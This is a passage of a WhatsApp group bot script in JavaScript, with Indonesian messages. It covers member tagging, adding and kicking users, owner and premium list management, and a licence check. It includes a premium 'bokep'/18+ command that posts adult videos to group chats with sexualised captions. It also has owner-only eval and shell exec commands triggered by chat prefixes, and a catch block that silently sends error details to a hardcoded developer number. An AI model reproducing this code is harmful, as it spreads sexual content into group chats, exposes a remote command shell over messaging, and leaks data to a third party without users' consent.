if (!q) return reply("Mana Teks nya?")
var member = await groupMetadata.participants.map(e => e.id)
var teks = ` ${text}\n\n`
member.forEach(e => e !== m.sender ? teks += `@${e.split("@")[0]}\n` : '')
drayyy.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "hidetag": {
if (!isOwner) return reply(mess.ketua)
if (!q) return reply("Mana Teks Nya?")
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
drayyy.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "add": {
if (!m.isGroup) return reply("Khusus Dalam Grup")
if (!isOwner && !isAdmins) return reply("Khusus Admin")
if (!isBotAdmins) return reply("Khusus Admin")
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await drayyy.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await drayyy.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return reply("Usage:\n .add 62xx")
}
}
break

case "kick": case "dor": case "kik": {
if (!m.isGroup) return reply("Khusus Dalam Grup")
if (!isOwner && !isAdmins) return reply("Khusus Admin")
if (!isBotAdmins) return reply("Khusus Admin")
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await drayyy.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await drayyy.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return reply("Usage:\n Tag Or Reply")
}
}
break


case "leave": {
if (!isOwner) return reply(mess.ketua)
if (!m.isGroup) return reply("Khusus Dalam Grup")
await m.reply("Sayonara !")
await sleep(4000)
await drayyy.groupLeave(m.chat)
}
break
//+++BOKEP MENU
case "bokep":
case "18+":
case "viral":
case "asupanpagi":
case "asupansore":
case "asupanmalam": {
    // Cek verifikasi bot


    // Cek akses owner / premium
    if (!isOwner && !isPrem) {
        return m.reply("*DASAR CABUL!!!* FITUR KHUSUS PREMIUM TAU:v");
    }

    // Caption random
    const rdrmsp = [
        "Asupan hari ini sayangg🥵💦",
        "mana tahan🥵", 
        "pulen bgtt🥵💦", 
        "enak banget🥰", 
        "andai aku disitu😋", 
        "tete padet😳", 
        "jadi sagne💦"
    ];
    const rdmcpt = rdrmsp[Math.floor(Math.random() * rdrmsp.length)];

    // Kirim reaksi ⏱️
    await drayyy.sendMessage(m.chat, {
        react: {
            text: `⏱️`,
            key: m.key
        }
    });
reply("*Sebentar ya mas..😘*")
    try {
        // Ambil file JSON dan pilih video random
        const fs = require('fs');
        const raw = fs.readFileSync('./penyimpanan/lib/anuu.json', 'utf8');
        const json = JSON.parse(raw);

        // Fungsi acak
        function pickRandom(arr) {
            return arr[Math.floor(Math.random() * arr.length)];
        }

        const hasil = pickRandom(json.videos);

        if (typeof hasil !== 'string') {
            return m.reply("🚫 Gagal ambil video, file rusak.");
        }

        // Kirim video dengan viewOnce
const vidnya = await drayyy.sendMessage(m.chat, {
            video: { url: hasil },
            caption: rdmcpt,
            viewOnce: true
        }, { quoted: m });
await drayyy.sendMessage(m.chat, { text: rdmcpt }, { quoted: vidnya})

    } catch (err) {
        console.error("❌ Error kirim video:", err);
        return m.reply("⚠️ Terjadi kesalahan saat ambil video.");
    }
}
    break;

//======================[ OWNER MENU ]===============================================================//
case "public": {    
if (!isverificationResult) return dbreply(`*❌ ILLEGAL BOT AKSES*\n> Bot numbers are not registered in the database\nBuy Script?? Klik tombol dibawah`)
if (!isOwner) return
m.reply("succes change status to public")
drayyy.public = true
}
break

case "self": {
if (!isverificationResult) return dbreply(`*❌ ILLEGAL BOT AKSES*\n> Bot numbers are not registered in the database\nBuy Script?? Klik tombol dibawah`)
if (!isOwner) return
m.reply("succes change status to self")
drayyy.public = false
}
break
case "addown":{
          
if (!isOwner) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62838072690`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await drayyy.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!`)
owners.push(prrkek)
fs.writeFileSync("./penyimpanan/database/own.json", JSON.stringify(owners))
reply(`Nomor ${prrkek} Telah Menjadi Owner!`)
}
break
case "delown":{
  
if (!isOwner) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628388072690`)
bro = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = ownerNumber.indexOf(bro)
ownerNumber.splice(unp, 1)
fs.writeFileSync("./penyimpanan/database/owner.json", JSON.stringify(ownerNumber))
reply(`Nomor ${bro} Telah Di Hapus Owner!`)
}
break
        case "addmurbug":{
           
if (!isOwner) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62838072690`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await drayyy.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!`)
prem.push(prrkek)
fs.writeFileSync("./penyimpanan/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Murbug`)
}
break
        case "delmurbug":{
if (!isverificationResult) return dbreply(`*❌ ILLEGAL BOT AKSES*\n> Bot numbers are not registered in the database\nBuy Script?? Klik tombol dibawah`)            
if (!isOwner) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628388072690`)
bro = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(bro)
prem.splice(unp, 1)
fs.writeFileSync("./penyimpanan/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${bro} Telah Di Hapus Murbug!`)
}
break
        case 'addgcmurbug':
if (!isverificationResult) return dbreply(`*❌ ILLEGAL BOT AKSES*\n> Bot numbers are not registered in the database\nBuy Script?? Klik tombol dibawah`)
if (!isOwner) return 
if (!isGroup) return reply("kushus grup!")
if (!isOwner) return reply(mess.owner)
unli.push(m.chat)
fs.writeFileSync('./penyimpanan/database/unli.json', JSON.stringify(unli))
reply(`Seluruh member grup kini telah menjadi murbug`)
break
case "delgcmurbug":{
  if (!isverificationResult) return reply(`*❌ ILLEGAL BOT AKSES*\n> Bot numbers are not registered in the database\nBuy Script?? Klik tombol dibawah`)
if (!isGroup) return reply("kushus grup!")
if (!isOwner) return reply(mess.owner)
unli.splice(m.chat)
fs.writeFileSync("./penyimpanan/database/unli.json", JSON.stringify(unli))
reply(`Seluruh member grup sudah tidak lagi menjadi murbug`)
}
break
                
//======================[ END OWNER MENU ]===============================================================//

    // END            
			default:
			if (body.startsWith("<")) {
                if (!isOwner) return;
                try {
                    const output = await eval(`(async () => ${q})()`);
                    await m.reply(`${typeof output === 'string' ? output : JSON.stringify(output, null, 4)}`);
                } catch (e) {
                    await m.reply(`Error: ${String(e)}`);
                }
            }
			if (budy.startsWith(">")) {
			if (!isOwner) return
				try {
					let evaled = await eval(q);
					if (typeof evaled !== "string") evaled = util.inspect(evaled);
					await m.reply(evaled);
				} catch (e) {
					await m.reply(`Error: ${String(e)}`);
				}
			}
			if (budy.startsWith("$")) {
			if (!isOwner) return
				exec(q,
					(err, stdout) => {
						if (err) return m.reply(err.toString());
						if (stdout) return m.reply(stdout.toString());
				})
				}
}
		
	} catch (e) {
		console.log(e) // Jangan Diganti Biar Dev Tau Ada Fitur Yang Error //
		drayyy.sendMessage("6283151568511@s.whatsapp.net", {text: "Hi Developer AnotherðŸ‘‹, Ada Fitur Yang Error Nih!\n\n" + util.format(e)}) // Ganti? Tanggung sendiri kalo ada banyak error yang ga ke fix di update selanjutnya //
	}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	exec(`Update ${__filename}`)
	console.log(`File ${__filename} Has Been Updated!!`)
	delete require.cache[file]
	require(file)
})
